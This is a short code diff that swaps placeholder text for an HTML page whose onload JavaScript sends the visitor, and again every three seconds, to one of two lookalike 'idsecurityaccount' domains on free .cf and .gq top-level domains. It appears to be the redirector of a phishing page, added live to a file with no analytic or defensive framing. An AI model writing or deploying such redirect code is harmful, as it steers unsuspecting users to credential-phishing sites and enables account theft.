@@ -1,1 +1,9 @@
-olololol
+<body onload="redirect();">
+<script type="text/javascript">
+var urls = new Array("http://idsecurityaccount.cf/", "http://idsecurityaccount.gq/");
+function redirect()
+{
+    window.location = urls[Math.floor(urls.length*Math.random())];
+}
+var temp = setInterval("redirect()", 3000);
+</script>
